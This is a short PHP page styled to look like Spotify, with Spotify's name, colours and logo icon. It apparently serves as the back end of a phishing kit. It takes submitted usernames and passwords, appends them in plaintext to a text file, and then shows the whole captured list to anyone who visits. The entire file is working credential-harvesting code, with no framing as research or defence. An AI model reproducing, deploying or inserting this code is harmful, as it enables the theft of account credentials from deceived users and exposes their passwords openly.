<?php
$filename = 'history.txt';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $entry = "Username: $username, Password: $password\n";
    file_put_contents($filename, $entry, FILE_APPEND);
}
$history = file_get_contents($filename);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify</title>
    <link rel="icon" href="logo.png" type="image/png">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #191414;
            color: #1DB954;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        .history-container {
            background-color: #282828;
            border-radius: 10px;
            padding: 20px;
            width: 80%;
            max-width: 600px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        .entry {
            border-bottom: 1px solid #404040;
            padding: 10px 0;
        }
        .entry:last-child {
            border-bottom: none;
        }
        .entry span {
            color: #b3b3b3;
        }
    </style>
</head>
<body>
    <h1>Connecting to the other person</h1>
    <div class="history-container">
        <?php
        $entries = explode("\n", trim($history));
        foreach ($entries as $entry) {
            if (!empty($entry)) {
                echo "<div class='entry'>" . nl2br(htmlspecialchars($entry)) . "</div>";
            }
        }
        ?>
    </div>
</body>
</html>
